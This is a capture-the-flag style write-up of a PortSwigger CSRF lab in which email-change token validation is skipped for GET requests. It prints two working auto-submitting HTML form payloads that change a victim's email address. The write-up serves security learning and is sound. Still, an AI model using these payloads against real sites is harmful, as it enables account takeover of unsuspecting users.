---
layout: post
title: "Lab: CSRF where token validation depends on request method [Write-up]"
date: 2026-08-22
platform: portswigger
vulntype: csrf
difficulty: Medium
category: write-up
tags: [web]
---

## Overview

**Lab:** CSRF where token validation depends on request method

**Platform:** PortSwigger

**Difficulty:** Medium

---

## Description

This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

## Step 1: Log in to your account

`wiener:peter`

## Step 2

From the problem description, we know that there is a vulnerability in email modification as well as in the request method.

Let's intercept the email change request using Burp Suite

<p align="center">
  <img src="/assets/css/img/CSRF/csrf9.png" alt="csrf" />
</p>

## Step 3 

Copy the entire request and generate a payload. If you're using Burp Suite Pro, you can use the built-in feature; if you have the standard version, you can use the tool I mentioned in the [first lab](https://cyberkry.github.io/write-up/portswigger-Lab-CSRF-vulnerability-with-no-defenses/).

<p align="center">
  <img src="/assets/css/img/CSRF/csrf10.png" alt="csrf" />
</p>

## Step 4

Let's move on to the exploit service and inject our payload

> ! Be sure to check that the HTML tag is closed at the end: </html>, and that “email” replaces %40 with @.

<p align="center">
  <img src="/assets/css/img/CSRF/csrf11.png" alt="csrf" />
</p>

## Step 5

From the problem description, we know that the vulnerability is in the request method, so let's change it to GET.

```python
<html>
	<body>
		<form method="GET" action="https://ID.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="test5@test.com"/>
			<input type="hidden" name="csrf" value="CSRF-TOKEN"/>
			<input type="submit" value="Submit">
		</form>
	</body>
</html>

<script>
        document.forms[0].submit();
</script>
```

Click on Store -> Deliver exploit to victim and complete the lab

After searching a bit more, I found an even shorter version, which I actually recommend using more. 

```python
<form action="https://ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="test6@test.com">
</form>
<script>
        document.forms[0].submit();
</script>
```

The payload worked because the server allowed the email address to be changed via a GET request and did not require a CSRF token when using GET. The browser automatically sent the authorized user's cookie, so the change occurred within the context of that user's session.

---
<div align="center">

This post is licensed under  
<a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a>.

© 2026 CyberKRY

</div>
